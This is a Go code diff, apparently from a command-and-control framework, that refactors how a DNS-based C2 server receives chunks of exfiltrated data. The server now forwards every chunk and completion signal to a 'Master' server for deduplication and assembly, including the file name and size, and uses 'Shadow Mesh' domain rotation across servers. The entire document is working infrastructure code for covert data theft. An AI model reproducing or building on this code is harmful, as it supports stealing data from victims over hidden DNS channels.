@@ -817,29 +817,31 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
 	tracker, ok := c2.getExfilTagTracker(tag)
 	if !ok || tracker.SessionID == 0 {
-		// If we don't know the session, try to forward the completion tag to Master
+		// If we don't know the session, forward the completion tag to Master
 		if masterClient != nil {
 			if err := masterClient.MarkExfilCompleteByTag(tag); err == nil {
 				if c2.debug {
-					logf("[Exfil] Forwarded orphan completion tag=%s to Master", tag)
+					logf("[Exfil] Forwarded completion tag=%s to Master (unknown session locally)", tag)
 				}
 				return true, nil
 			} else if c2.debug {
-				logf("[Exfil] Failed to forward orphan completion tag=%s: %v", tag, err)
+				logf("[Exfil] Failed to forward completion tag=%s: %v", tag, err)
 			}
 		}
 		return false, fmt.Errorf("unknown exfil session for completion")
 	}
 
 	sessionID := fmt.Sprintf("%08x", tracker.SessionID)
-	c2.mutex.RLock()
-	session, exists := c2.exfilSessions[sessionID]
-	c2.mutex.RUnlock()
-	if exists {
-		go c2.finalizeExfilSession(session)
-	}
-	c2.deleteExfilTagTracker(tag)
 
+	// Forward completion to Master - Master handles assembly
+	if masterClient != nil {
+		go masterClient.MarkExfilCompleteByTag(tag)
+		if c2.debug {
+			logf("[Exfil] Forwarded completion for session=%s to Master", sessionID)
+		}
+	}
+
+	c2.deleteExfilTagTracker(tag)
 	return true, nil
 }
 
@@ -993,7 +995,8 @@ func (c2 *C2Manager) cacheChunkInMemory(session *ExfilSession, chunkIndex uint32
 	session.PendingChunks[chunkIndex] = append([]byte(nil), data...)
 }
 
-// handleExfilChunk ingests a dedicated exfil client's chunk and tracks session progress.
+// handleExfilChunk ingests a dedicated exfil client's chunk and forwards to Master.
+// DNS server does NOT assemble - Master handles all assembly.
 func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clientIP string, plaintextOverride []byte) (bool, error) {
 	var (
 		plaintext []byte
@@ -1024,82 +1027,45 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 		return true, nil
 	}
 
-	// Track chunks received by this DNS server for stats, but DON'T block forwarding
-	// Multiple DNS servers may receive the same chunk (Shadow Mesh rotation)
-	// Archon handles deduplication - each DNS server should forward what it receives
-	var seenBefore bool
-
+	// Capture session fields under lock for use outside lock
 	c2.mutex.Lock()
-	if session.ReceivedChunks == nil {
-		session.ReceivedChunks = make(map[uint32]bool)
-	}
-	if session.ReceivedChunks[meta.ChunkIndex] {
-		seenBefore = true
-	} else {
-		session.ReceivedChunks[meta.ChunkIndex] = true
-		session.LastActivity = time.Now()
-	}
-	// Update total chunk hint if provided
 	if session.TotalChunks == 0 && meta.TotalChunks != 0 {
 		session.TotalChunks = meta.TotalChunks
 	}
+	session.LastActivity = time.Now()
+	// Capture values for forwarding (avoid race with goroutine)
+	totalChunks := session.TotalChunks
+	fileName := session.FileName
+	fileSize := session.FileSize
 	c2.mutex.Unlock()
 
-	// CRITICAL FIX: Don't return early for duplicates
-	// Shadow Mesh means exfil client rotates domains, so the same chunk
-	// may arrive at different DNS servers. Each server must forward to Archon.
-	// Archon's StoreExfilChunk() has proper deduplication with ON CONFLICT DO NOTHING
-	//
-	// Previous behavior would block forwarding if this DNS server saw the chunk before,
-	// which broke Shadow Mesh reliability when chunks arrived at multiple servers.
-
-	// Try to persist locally for retry capability
-	inserted := true
+	// Persist locally for retry capability (in case Master is temporarily unavailable)
 	if c2.db != nil {
-		var dbErr error
-		inserted, dbErr = c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext)
-		if dbErr != nil {
+		if _, dbErr := c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext); dbErr != nil {
 			if c2.debug {
-				logf("[Exfil] DB persist failed (session=%s idx=%d): %v — caching in memory", sessionID, meta.ChunkIndex, dbErr)
+				logf("[Exfil] DB persist failed (session=%s idx=%d): %v", sessionID, meta.ChunkIndex, dbErr)
 			}
-			c2.cacheChunkInMemory(session, meta.ChunkIndex, plaintext)
-			// Don't return - still forward to Master
 		}
-	} else {
-		c2.cacheChunkInMemory(session, meta.ChunkIndex, plaintext)
-	}
-
-	// Update stats only if this is truly new to THIS DNS server
-	now := time.Now()
-	if !seenBefore && inserted {
-		c2.mutex.Lock()
-		session.ReceivedCount++
-		session.LastChunkAt = now
-		if session.Status == "" {
-			session.Status = "receiving"
-		}
-		c2.mutex.Unlock()
-	}
-
-	c2.mutex.Lock()
-	received := session.ReceivedCount
-	total := session.TotalChunks
-	c2.mutex.Unlock()
-
-	c2.persistExfilSession(session)
-
-	// ALWAYS forward to Master (unless we've seen it before AND already in DB)
-	// This allows Shadow Mesh to work: different DNS servers forward same chunk
-	if masterClient != nil && !seenBefore {
-		go c2.submitExfilChunkToMaster(session, meta, plaintext)
-	}
-
-	if meta.IsFinal() || (total > 0 && received >= int(total)) {
-		go c2.finalizeExfilSession(session)
 	}
 
 	if c2.debug {
-		logf("[Exfil] chunk session=%s job=%s idx=%d/%d bytes=%d ip=%s", sessionID, jobID, meta.ChunkIndex, session.TotalChunks, len(plaintext), clientIP)
+		logf("[Exfil] chunk session=%s idx=%d/%d bytes=%d - forwarding to Master", sessionID, meta.ChunkIndex, totalChunks, len(plaintext))
+	}
+
+	// ALWAYS forward to Master - Master handles deduplication and assembly
+	if masterClient != nil {
+		// Build request with captured values (no race)
+		req := ExfilChunkRequest{
+			SessionID:   sessionID,
+			JobID:       jobID,
+			ChunkIndex:  int(meta.ChunkIndex),
+			TotalChunks: int(totalChunks),
+			PayloadB64:  base64.StdEncoding.EncodeToString(plaintext),
+			FileName:    fileName,
+			FileSize:    int64(fileSize),
+			IsFinal:     meta.IsFinal(),
+		}
+		go c2.submitExfilChunkToMasterDirect(req, sessionID, int(meta.ChunkIndex))
 	}
 
 	return true, nil
@@ -1192,6 +1158,27 @@ func (c2 *C2Manager) persistExfilSession(session *ExfilSession) {
 	}
 }
 
+func (c2 *C2Manager) submitExfilChunkToMasterDirect(req ExfilChunkRequest, sessionID string, chunkIndex int) {
+	if masterClient == nil {
+		return
+	}
+
+	_, err := masterClient.SubmitExfilChunk(req)
+	if err != nil {
+		if c2.debug {
+			logf("[Exfil] Failed to forward chunk %d for session %s: %v - will retry from disk", chunkIndex, sessionID, err)
+		}
+		return
+	}
+
+	// Mark as synced in DB
+	if c2.db != nil {
+		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
+			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
+		}
+	}
+}
+
 func (c2 *C2Manager) submitExfilChunkToMaster(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
 	if masterClient == nil || session == nil || meta == nil {
 		return
@@ -1210,28 +1197,19 @@ func (c2 *C2Manager) submitExfilChunkToMaster(session *ExfilSession, meta *Exfil
 	}
 	c2.mutex.RUnlock()
 
-	completed, err := masterClient.SubmitExfilChunk(req)
+	_, err := masterClient.SubmitExfilChunk(req)
 	if err != nil {
 		if c2.debug {
 			logf("[Exfil] Failed to forward chunk %d for session %s: %v - will retry from disk", meta.ChunkIndex, session.SessionID, err)
 		}
-		// Do NOT cache in memory. It's already on disk (unsynced).
-		// The retry loop will pick it up.
 		return
 	}
 
 	// Mark as synced in DB
 	if c2.db != nil {
-		if err := c2.db.MarkExfilChunkSynced(session.SessionID, int(meta.ChunkIndex)); err != nil {
+		if err := c2.db.MarkExfilChunkSynced(session.SessionID, int(meta.ChunkIndex)); err != nil && c2.debug {
 			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", session.SessionID, meta.ChunkIndex, err)
 		}
-	}
-
-	if completed {
-		if c2.debug {
-			logf("[Exfil] Master signaled session %s is complete", session.SessionID)
-		}
-		c2.finalizeExfilSession(session)
 	}
 }
 
